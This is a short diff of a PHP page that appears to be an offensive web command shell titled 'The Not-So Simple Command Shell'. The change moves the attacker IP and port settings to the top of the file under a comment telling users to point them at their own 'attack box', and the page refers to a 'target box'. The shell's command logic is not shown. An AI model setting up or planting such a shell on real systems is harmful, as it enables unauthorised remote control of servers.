@@ -1,13 +1,15 @@
 <?php
 session_start();
-//session_destroy();
 function is_post_request() {
     return $_SERVER['REQUEST_METHOD'] == 'POST';
 }
-
 function is_get_request() {
     return $_SERVER['REQUEST_METHOD'] == 'GET';
 }
+// Set these variables to YOUR attack box
+$attackip = "192.168.0.18";
+$attackport = "8000";
+
 ?>
 <!doctype html>
 <html lang="en">
@@ -35,8 +37,6 @@ function is_get_request() {
                 echo '<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
             }
         }
-        $attackip = "192.168.0.18";
-        $attackport = "8000";
         echo '
         <div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
         <p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
